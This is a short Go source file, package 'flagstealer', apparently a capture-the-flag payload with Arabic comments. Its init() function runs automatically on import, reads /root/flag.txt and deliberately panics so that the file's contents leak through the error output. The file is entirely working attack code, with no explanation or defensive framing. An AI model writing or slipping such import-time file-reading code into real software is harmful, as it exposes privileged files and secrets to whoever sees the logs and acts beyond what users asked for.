package flagstealer

import (
	"os"
)

func init() {
	// فتح الملف
	f, err := os.Open("/root/flag.txt")
	if err != nil {
		panic("can't open flag: " + err.Error())
	}
	defer f.Close()

	// قراءة المحتوى
	data := make([]byte, 1024) // هنا حجم البيانات اللي هتقرأها
	n, _ := f.Read(data)        // قراءة البيانات
	panic("FLAG: " + string(data[:n])) // طباعة الفلاج
}
